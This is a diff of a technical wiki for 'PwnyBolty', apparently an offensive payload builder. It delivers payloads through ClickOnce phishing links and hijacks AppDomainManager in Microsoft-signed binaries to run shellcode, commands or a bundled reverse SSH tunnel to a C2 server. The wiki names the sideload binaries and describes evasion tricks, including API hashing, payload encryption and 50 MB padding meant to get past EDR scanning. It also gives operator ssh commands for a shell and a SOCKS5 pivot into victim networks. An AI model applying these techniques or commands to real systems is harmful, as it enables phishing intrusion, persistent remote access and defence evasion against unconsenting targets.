@@ -1,180 +1,230 @@
 # PwnyBolty — Technical Wiki
 
+PwnyBolty has two payload modes. Both deliver via **ClickOnce** and use **AppDomainManager hijacking** to load a custom DLL into a Microsoft-signed binary — no admin rights, no custom signing required.
+
+| Mode | What it does |
+|------|-------------|
+| **CFCO** (ClickForClickOnce) | Executes shellcode, drops files, or runs OS commands on the target |
+| **Bolthole** | Establishes a persistent reverse SSH tunnel back to your C2 server |
+
 ---
 
-## Architecture
+## System Architecture
+
+One Docker container runs everything. Caddy handles the web UI and file serving; the FastAPI backend manages builds in the background.
 
 ```mermaid
 flowchart TB
     Operator([Operator])
 
     subgraph Docker["Docker Container"]
-        Caddy["Caddy\n(port 80)\n/static/ · /build/"]
-        API["FastAPI\n(port 8000)\napp.py"]
-        Builder["Builder / BoltholeBuilder\nmsbuild + Mono"]
+        Caddy["Caddy (port 80)\nServes UI + build artifacts"]
+        API["FastAPI (port 8000)\nBuild API"]
+        Builder["Builder\nmsbuild + Mono"]
 
         Caddy -- "/api/*" --> API
-        API -- "BackgroundTask" --> Builder
+        API -- "Background Task" --> Builder
     end
 
-    subgraph Artifacts["build/id/"]
+    subgraph Output["build/<id>/"]
         ZIP["payload.zip"]
         Log["build.log"]
-        OpKey["operator_key  ·Bolthole·"]
-        Phish["phish.html  ·Bolthole·"]
-        C2Sh["c2_setup.sh  ·Bolthole·"]
+        OpKey["operator_key  [Bolthole only]"]
+        C2Sh["c2_setup.sh  [Bolthole only]"]
     end
 
     Operator -- "POST /api/build\nPOST /api/bolthole-build" --> Caddy
-    Builder --> Artifacts
-    Operator -- "downloads artifacts" --> Caddy
-    Caddy --> Artifacts
+    Builder --> Output
+    Operator -- "Download artifacts" --> Caddy
+    Caddy --> Output
 ```
 
 ---
 
-## CFCO Build Flow
+## Mode 1 — CFCO (ClickForClickOnce)
+
+### What happens on the server (build phase)
+
+The operator submits a build request. The API returns a `buildid` immediately and compiles the payload in the background.
 
 ```mermaid
 sequenceDiagram
     actor Operator
     participant API as FastAPI
-    participant Builder as Builder
-    participant Caddy as Caddy/Static
-    participant Target as Target Machine
+    participant Builder as CFCO Builder
+    participant Caddy as File Server
 
     Operator->>API: POST /api/build
     API-->>Operator: { buildid }
-    API->>Builder: Spawn BackgroundTask
+    API->>Builder: Start background build
 
-    Note over Builder: 1. Copy templates/src/<br/>2. Substitute HMAC-MD5 API hashes<br/>3. Generate Data.cs for inflation<br/>4. msbuild compile DLL<br/>5. Encrypt actions to config.json<br/>6. Package and zip artifacts
+    Note over Builder: 1. Copy C# source template<br/>2. Generate per-build HMAC-MD5 hashes for ntdll + LdrCallEnclave<br/>3. Generate Data.cs to inflate .text section<br/>4. Compile DLL with msbuild<br/>5. Encrypt actions (shellcode / cmd / file) into config.json<br/>6. Package everything into payload.zip
 
-    Builder-->>Caddy: build/id/ ready
-
-    Operator->>Target: Deliver phishing link
-    Target->>Caddy: GET payload.application
-    Caddy-->>Target: ClickOnce deployment manifest
-    Target->>Caddy: Download .deploy files
-    Caddy-->>Target: DLL + config.json + sideload EXE
-
-    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager hijack loads DLL<br/>DLL decrypts and reads config.json
-
-    alt run_code
-        Target->>Target: Execute shellcode via LdrCallEnclave
-    else run_cmd
-        Target->>Target: Run OS command
-    else drop_file
-        Target->>Target: Write file to disk
-    end
+    Builder-->>Caddy: build/<id>/ ready
+    Caddy-->>Operator: Download payload.zip
 ```
 
----
-
-## Bolthole Build Flow
+### What happens on the target (execution phase)
 
 ```mermaid
 sequenceDiagram
     actor Operator
-    participant API as FastAPI
-    participant Builder as BoltholeBuilder
-    participant Caddy as Caddy/Static
-    participant C2 as C2 Server
+    participant Caddy as File Server
     participant Target as Target Machine
 
-    Operator->>API: POST /api/bolthole/c2 {ssh_host, ssh_user, ports}
-    API-->>Operator: Global outbound keypair generated and stored
+    Operator->>Target: Send phishing link
 
-    Operator->>API: POST /api/bolthole-build
-    API-->>Operator: { buildid }
-    API->>Builder: Spawn BackgroundTask
+    Target->>Caddy: GET payload.application (ClickOnce manifest)
+    Caddy-->>Target: Manifest + .deploy files (DLL, config.json, sideload EXE)
 
-    Note over Builder: Generate per-build ECDSA operator keypair<br/>Generate per-build RSA-2048 boltd host key<br/>Embed global outbound key as user_key<br/>msbuild compile Bolthole.dll<br/>Package BoltFiles: boltd · boltcon · libcrypto<br/>authorized_keys · boltd-config · user_key<br/>Generate phish.html + c2_setup.sh
+    Note over Target: Windows launches the Microsoft-signed EXE<br/>AppDomainManager config redirects .NET runtime<br/>Custom DLL loads automatically (no UAC prompt)<br/>DLL reads and decrypts config.json
 
-    Builder-->>Caddy: build/id/ ready
-    Caddy-->>Operator: ZIP · operator_key · phish.html · c2_setup.sh
-
-    Operator->>C2: Run c2_setup.sh
-    Note over C2: Creates SSH user (nologin)<br/>Adds outbound pubkey to authorized_keys<br/>Enables TCP forwarding + GatewayPorts<br/>Opens firewall ports (443, 80, 22, ...)
-
-    Operator->>Target: Deliver phishing link (phish.html)
-    Target->>Caddy: GET payload.application
-    Caddy-->>Target: ClickOnce manifest + .deploy files
-
-    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager loads Bolthole.dll<br/>Extract BoltFiles · start boltd · start boltcon
-
-    Target->>C2: Reverse SSH tunnel (ports 443 → 80 → 22 → ...)
-    Operator->>C2: ssh -i operator_key -p tunnel_port user@c2
-    C2-->>Operator: Shell on Target + SOCKS5 pivot
+    alt Shellcode execution
+        Target->>Target: Execute shellcode via LdrCallEnclave (8-min delayed start)
+    else OS command
+        Target->>Target: Run command with environment variable expansion
+    else File drop
+        Target->>Target: Write file to target path
+    end
 ```
+
+**Sideload targets** (all Microsoft-signed):
+
+| Name | Binary |
+|------|--------|
+| `tzsync` | tzsync.exe |
+| `perfwatson2` | PerfWatson2.exe |
+| `systemhost` | ServiceHub.Host.netfx.x64.exe |
+| `powershell` | powershell_ise.exe |
 
 ---
 
-## Bolthole Sequence
+## Mode 2 — Bolthole (Reverse SSH Tunnel)
+
+### Overview
+
+Bolthole bundles a miniature SSH daemon (`boltd`) and SSH client (`boltcon`) inside the ClickOnce package. Once the target runs the payload, it calls home through common firewall-allowed ports (443, 80, 22 …) and establishes a reverse tunnel back to your C2 server. The operator then SSHes into the tunnel and gets a shell — plus an optional SOCKS5 proxy for lateral movement.
+
+### Step 1 — Configure C2 (one-time setup)
+
+Before building, save your C2 details so PwnyBolty can generate and store the global outbound keypair. This keypair is reused across all Bolthole builds so your C2 only needs one `authorized_keys` entry.
 
 ```mermaid
 sequenceDiagram
     actor Operator
     participant UI as PwnyBolty UI
     participant API as FastAPI
-    participant Builder as BoltholeBuilder
     participant C2 as C2 Server
-    participant Target as Target Machine
 
-    Operator->>UI: Configure C2 (ssh_host, ssh_user, ports)
+    Operator->>UI: Enter C2 host, SSH user, ports, tunnel range
     UI->>API: POST /api/bolthole/c2
-    API-->>UI: Global outbound keypair generated and stored
+    API-->>UI: Global outbound keypair generated and saved to disk
 
-    Operator->>C2: Run generated c2_setup.sh
-    Note over C2: Creates restricted SSH user<br/>Adds outbound pubkey to authorized_keys<br/>Enables TCP forwarding and GatewayPorts<br/>Opens firewall ports (443, 80, 22, ...)
+    Operator->>C2: Run c2_setup.sh (generated by the UI)
+    Note over C2: Creates a restricted SSH user (no login shell)<br/>Adds outbound public key to authorized_keys<br/>Enables TCP forwarding and GatewayPorts in sshd_config<br/>Opens required firewall ports (443, 80, 22, ...)
+```
+
+### Step 2 — Build the payload
+
+```mermaid
+sequenceDiagram
+    actor Operator
+    participant UI as PwnyBolty UI
+    participant API as FastAPI
+    participant Builder as Bolthole Builder
 
     Operator->>UI: Submit Bolthole build request
     UI->>API: POST /api/bolthole-build
-    API->>Builder: Spawn BackgroundTask
+    API->>Builder: Start background build
 
-    Note over Builder: 1. Generate per-build ECDSA operator keypair<br/>2. Generate per-build RSA-2048 boltd host key<br/>3. Embed global outbound key as user_key<br/>4. Template Program.cs (host, ports, delays)<br/>5. msbuild compile Bolthole.dll<br/>6. Package DLL + BoltFiles<br/>7. Write phish.html and c2_setup.sh
+    Note over Builder: 1. Generate per-build ECDSA-256 operator keypair<br/>2. Generate per-build RSA-2048 boltd host key<br/>3. Embed global outbound key as {ssh_user}_key<br/>4. Substitute all values into Program.cs<br/>   (host, user, ports, tunnel range, delays, filenames)<br/>5. Compile Bolthole DLL with msbuild<br/>6. Bundle DLL + BoltFiles into ClickOnce package<br/>7. Generate phishing page and c2_setup.sh
 
-    Builder-->>Operator: build/id/ ready (ZIP, operator_key, phish.html, c2_setup.sh)
+    Builder-->>Operator: payload.zip · operator_key · c2_setup.sh
+```
 
-    Operator->>Target: Deliver phishing link (phish.html)
-    Target->>C2: GET provider_url/payload.application
-    C2-->>Target: ClickOnce deployment manifest
-    Target->>C2: Download all .deploy files
+**BoltFiles** — binaries embedded in the ClickOnce package and extracted to a temp directory on the target:
 
-    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager hijack loads Bolthole.dll<br/>DLL unpacks BoltFiles to temp dir<br/>Starts boltd (SSH daemon on 127.0.0.1:tunnel_port)<br/>Starts boltcon, tries ports 443 → 80 → 22 → ...
+| File | Role |
+|------|------|
+| `boltd.exe` | Miniature SSH daemon — listens on `127.0.0.1:<tunnel_port>` |
+| `boltcon.exe` | SSH client — connects outbound to C2, creates the reverse tunnel |
+| `libcrypto.dll` | Crypto library required by boltd/boltcon |
+| `boltd-hostkey` | Per-build RSA-2048 host key for boltd (unique per deployment) |
+| `boltd-config` | SSH daemon config (port, listen address, auth settings) |
+| `authorized_keys` | Per-build operator public key (who can SSH into the tunnel) |
+| `{ssh_user}_key` | Global outbound private key (boltcon authenticates to C2 with this) |
+
+### Step 3 — Delivery and tunnel establishment
+
+```mermaid
+sequenceDiagram
+    actor Operator
+    participant Caddy as File Server
+    participant Target as Target Machine
+    participant C2 as C2 Server
+
+    Operator->>Target: Send phishing link (phish.html)
+
+    Target->>Caddy: GET payload.application
+    Caddy-->>Target: ClickOnce manifest + all .deploy files
+
+    Note over Target: Microsoft-signed EXE launches<br/>AppDomainManager loads Bolthole.dll<br/>DLL extracts BoltFiles to %TEMP%<br/>Starts boltd on 127.0.0.1:<tunnel_port><br/>Starts boltcon — tries ports 443 → 80 → 22 → ...
 
     Target->>C2: Reverse SSH tunnel established
-    Note over C2: boltd reachable via tunnel_port (31332)<br/>SOCKS5 proxy bound on socks_port (1080)
+    Note over C2: Tunnel port (e.g. 31332) now reachable<br/>SOCKS5 proxy bound on configured socks_port
 
     Operator->>C2: ssh -i operator_key -p 31332 user@c2
-    C2-->>Operator: Interactive shell on Target
-    Operator->>C2: ssh -D local_port (SOCKS5 pivot)
-    C2-->>Operator: Full network access into Target environment
+    C2-->>Operator: Interactive shell on target machine
+
+    Operator->>C2: ssh -D 1080 -i operator_key -p 31332 user@c2
+    C2-->>Operator: SOCKS5 pivot into target network
 ```
+
+> **How the operator finds the tunnel port:** When the target connects, `boltcon` uses the Windows username and machine name as the SSH username in the format `<user>.<machine>.p<PORT>`. The C2 auth log shows this: `journalctl -u ssh | grep "Invalid user"`. The `.p<PORT>` suffix is the active tunnel port.
 
 ---
 
 ## Payload Encryption
 
-Shellcode and dropped files are encrypted by `Mutator` before embedding. Each encrypted blob has the following binary layout:
+Shellcode and dropped files are encrypted by the `Mutator` class before being written to `config.json`. The binary format is self-describing — the DLL reads the header to know which algorithm to use and how large each field is.
 
 ```mermaid
 flowchart LR
-    A["**MD5**\n16 B"]
-    B["**Type**\n4 B\nXOR=0 RC4=1"]
-    C["**Key Size**\n4 B"]
-    D["**Nonce Size**\n4 B"]
-    E["**Payload Size**\n4 B"]
-    F["**Key**\nvariable"]
-    G["**Nonce**\nvariable"]
-    H["**Encrypted Payload**\nvariable\nXOR or RC4"]
+    A["MD5\n16 bytes\nIntegrity check"]
+    B["Type\n4 bytes\n0=XOR · 1=RC4"]
+    C["Key Size\n4 bytes"]
+    D["Nonce Size\n4 bytes"]
+    E["Payload Size\n4 bytes"]
+    F["Key\nvariable"]
+    G["Nonce\nvariable"]
+    H["Encrypted Payload\nvariable"]
 
     A --- B --- C --- D --- E --- F --- G --- H
 ```
 
-- **MD5** — integrity check of the plaintext payload before encryption
-- **Type** — selects the decryption algorithm at runtime (`0` = XOR, `1` = RC4)
-- **Key / Nonce** — random alphanumeric bytes, length chosen randomly between 16–32 bytes per build
-- **Encrypted Payload** — XOR key-repeating or RC4 PRGA over the raw shellcode/file bytes
-- **Inflation** — optionally padded to 50 MB with random noise + null bytes to further hinder scanning
+| Field | Detail |
+|-------|--------|
+| **MD5** | Hash of the plaintext — verified after decryption to detect corruption |
+| **Type** | Chooses XOR (key-repeating) or RC4 (PRGA) at runtime |
+| **Key / Nonce** | Random alphanumeric bytes, 16–32 bytes in length, chosen per build |
+| **Encrypted Payload** | Raw shellcode or file bytes encrypted with the chosen algorithm |
 
-API exports (`ntdll.dll`, `LdrCallEnclave`) are resolved at runtime using HMAC-MD5 hashes with a random 64-bit key baked in per-build, avoiding static import table entries.
+**Inflation** — encrypted blobs can be padded to 50 MB (40% random noise + 60% null bytes) to push past EDR size-scan thresholds.
+
+**API hash resolution** — `ntdll.dll` and `LdrCallEnclave` are resolved at runtime using HMAC-MD5 with a random 64-bit key baked in per build, so no function names appear in the import table.
+
+---
+
+## Key Terms
+
+| Term | Meaning |
+|------|---------|
+| **ClickOnce** | Microsoft deployment technology that installs and runs .NET apps from a URL — no installer needed |
+| **AppDomainManager hijack** | A `.config` file alongside the EXE redirects the .NET runtime to load a custom DLL as the AppDomainManager, giving code execution inside a trusted process |
+| **Sideloading** | Loading a custom DLL by placing it next to a legitimate signed binary that will load it automatically |
+| **boltd** | Minimal SSH daemon bundled in the package, runs locally on the target |
+| **boltcon** | SSH client bundled in the package, connects outbound from target to C2 |
+| **Reverse SSH tunnel** | The target initiates the outbound connection (bypassing inbound firewall rules); the operator connects inbound through that tunnel |
+| **SOCKS5 pivot** | SSH dynamic port forwarding that lets the operator route arbitrary TCP traffic through the tunnel into the target network |
+| **Operator keypair** | Per-build ECDSA keypair — private key goes to the operator, public key is embedded in `authorized_keys` inside the package |
+| **Global outbound keypair** | Shared ECDSA keypair used by `boltcon` to authenticate to C2 — one entry in the C2's `authorized_keys` covers all builds |
